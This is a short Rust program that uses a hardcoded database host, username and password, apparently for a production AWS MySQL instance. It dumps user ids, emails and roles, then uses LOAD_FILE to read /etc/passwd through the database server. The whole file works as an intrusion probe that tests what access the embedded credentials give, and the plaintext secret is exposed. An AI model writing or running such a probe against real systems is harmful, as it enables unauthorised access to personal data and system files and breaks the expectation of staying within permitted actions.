use mysql::prelude::*;
use mysql::*;

fn main() {
    let opts = OptsBuilder::new()
        .ip_or_hostname(Some("api-service-database.cq9ruxfeoibr.us-east-1.rds.amazonaws.com"))
        .tcp_port(3306)
        .user(Some("apiservice"))
        .pass(Some("LmGwA3T8vHVNs8fI43OPaTZf07JQRRhKrkNxX9izNq0="))
        .db_name(Some("api-service"));
    let pool = match Pool::new(opts) { Ok(p) => p, Err(e) => { println!("POOL_ERR {}", e); return; } };
    let mut conn = match pool.get_conn() { Ok(c) => c, Err(e) => { println!("CONN_ERR {}", e); return; } };
    let rows: Vec<(String, String, String)> = match conn.query("SELECT id, email, role FROM users LIMIT 5") {
        Ok(r) => r,
        Err(e) => { println!("QUERY_ERR {}", e); return; }
    };
    for r in rows { println!("USER {} {} {}", r.0, r.1, r.2); }
    let v: Option<String> = conn.query_first("SELECT LOAD_FILE('/etc/passwd')").ok().flatten();
    println!("PASSWD {:?}", v.map(|s| s.chars().take(200).collect::<String>()));
}
